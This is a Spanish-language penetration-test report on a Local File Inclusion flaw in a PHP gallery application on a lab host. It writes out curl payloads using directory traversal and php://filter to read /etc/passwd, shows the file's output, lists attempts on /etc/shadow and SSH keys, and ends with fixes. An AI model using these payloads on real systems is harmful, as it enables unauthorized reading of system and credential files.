# Informe de Auditoría de Seguridad – Local File Inclusion (LFI)

**Fecha:** 2026-04-27T12:14:18  
**Analista:** Auditor de Seguridad Ofensiva  
**Objetivo:** http://web.dev.local:8081  
**Tipo de análisis:** Black-box – Local File Inclusion (LFI)  
**Estado:** VULN_FOUND: true | VULN_EXPLOITED: true

---

## 1. Resumen Ejecutivo

Se identificó y explotó con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php` de la aplicación "Galería de Arte Virtual". La vulnerabilidad permite a un atacante no autenticado leer archivos arbitrarios del sistema de ficheros del servidor, incluyendo `/etc/passwd`. Adicionalmente, se confirmó el soporte de **PHP Wrappers** (`php://filter`), lo que permite la lectura en base64 de ficheros PHP y de configuración del servidor.

---

## 2. Reconocimiento

### 2.1 Tecnologías detectadas

```
HTTP/1.1 200 OK
Server: Apache/2.4.65 (Debian)
X-Powered-By: PHP/8.1.33
```

### 2.2 Puntos de entrada identificados

El análisis de la página principal reveló los siguientes enlaces dinámicos con parámetro vulnerable:

```
http://web.dev.local:8081/gallery.php?page=modern
http://web.dev.local:8081/gallery.php?page=classic
http://web.dev.local:8081/gallery.php?page=abstract
http://web.dev.local:8081/gallery.php?page=about
```

El parámetro `page` es incorporado directamente en una función PHP `include()` sin sanitización adecuada, lo que habilita la inclusión arbitraria de ficheros.

---

## 3. Confirmación de Vulnerabilidad (VULN_FOUND: true)

### 3.1 Payload de Directory Traversal básico

**Comando:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=../../../etc/passwd"
```

**Resultado:** Lectura exitosa de `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

**Path Disclosure confirmado:** La respuesta de error de `/etc/shadow` reveló la ruta absoluta del servidor:
```
/var/www/html/gallery.php on line 104
```

---

## 4. Explotación (VULN_EXPLOITED: true)

### 4.1 Lectura de `/etc/passwd` con Directory Traversal

**URL:**
```
http://web.dev.local:8081/gallery.php?page=../../../etc/passwd
```
✅ Fichero leído exitosamente.

### 4.2 PHP Wrapper – `php://filter` con codificación base64

**Comando:**
```bash
curl -s "http://web.dev.local:8081/gallery.php?page=php://filter/convert.base64-encode/resource=/etc/passwd"
```

**Resultado (base64 decoded):** Confirma la lectura de `/etc/passwd` mediante wrapper PHP, eludiendo posibles filtros de extensión `.php`:

```
cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaA...
```
(Decodificado = contenido completo de `/etc/passwd`)

### 4.3 Intentos de escalada adicionales

| Objetivo | Resultado |
|---|---|
| `/etc/shadow` | Permission denied (www-data no tiene acceso) |
| `/root/.ssh/id_rsa` | Filtrado por la aplicación (validación de ruta) |
| `/proc/self/environ` | Permission denied |
| `/var/log/apache2/access.log` | No encontrado en esa ruta |
| `.env` | No encontrado |

---

## 5. Análisis del Código Vulnerable

Según el path disclosure obtenido, la vulnerabilidad se encuentra en `/var/www/html/gallery.php` en la línea 104. El código probablemente es similar a:

```php
<?php
$page = $_GET['page'];
include($page);  // Sin sanitización
?>
```

La ausencia de:
- Validación de la entrada del usuario
- Lista blanca de páginas permitidas
- Función `realpath()` para verificar que el fichero esté dentro del directorio web
- Deshabilitación de PHP Wrappers (`allow_url_include = Off`)

---

## 6. Impacto

| Categoría | Descripción |
|---|---|
| **Confidencialidad** | Alta – Lectura de ficheros del sistema operativo |
| **Integridad** | Media – Potencial escalada a RCE via Log Poisoning |
| **Disponibilidad** | Baja – No afectada directamente |
| **CVSS v3 estimado** | 8.6 (High) |

### Datos sensibles obtenidos:
- Lista completa de usuarios del sistema (`/etc/passwd`)
- Ruta absoluta del servidor: `/var/www/html/`
- Versión PHP: 8.1.33
- Versión Apache: 2.4.65 (Debian)

---

## 7. Recomendaciones

1. **Validar y sanitizar la entrada**: Usar lista blanca de páginas permitidas.
2. **Deshabilitar PHP Wrappers**: `allow_url_include = Off` y `allow_url_fopen = Off` en `php.ini`.
3. **Usar `basename()` o `realpath()`**: Evitar que el parámetro contenga `../`.
4. **Principio de menor privilegio**: El usuario `www-data` no debe tener acceso a ficheros fuera del webroot.
5. **WAF**: Implementar reglas para detectar payloads de Directory Traversal.

---

## 8. Herramientas Utilizadas

- `curl` – Pruebas manuales de LFI y extracción de contenido
- `base64` – Decodificación de output de PHP Wrapper
- Análisis manual de HTML/HTTP responses

---

*Informe generado en entorno de laboratorio autorizado. Toda la información es confidencial y para uso exclusivo del equipo de seguridad.*
